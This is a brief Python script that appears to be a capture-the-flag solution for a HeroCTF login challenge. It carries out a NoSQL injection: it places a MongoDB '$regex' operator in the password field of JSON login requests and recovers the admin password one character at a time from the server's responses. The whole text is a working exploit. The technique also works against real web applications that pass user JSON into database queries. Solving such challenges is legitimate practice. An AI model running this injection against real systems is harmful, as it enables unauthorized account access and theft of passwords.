#!/usr/bin/env python3
import json
import string
import requests

flag = ""
url = "http://challs.heroctf.fr:3000/login"

print("password: ", end="")

for _ in range(32):
    for c in string.printable:
        data = {
                "username": "admin",
                "password": {"$regex": f"^{flag}{c}.*$"}
        }

        req = requests.post(url, json.dumps(data), headers={"Content-Type": "application/json"})
        
        if "You can validate" in req.text:
            flag += c
            print(c, end="", flush=True)
            break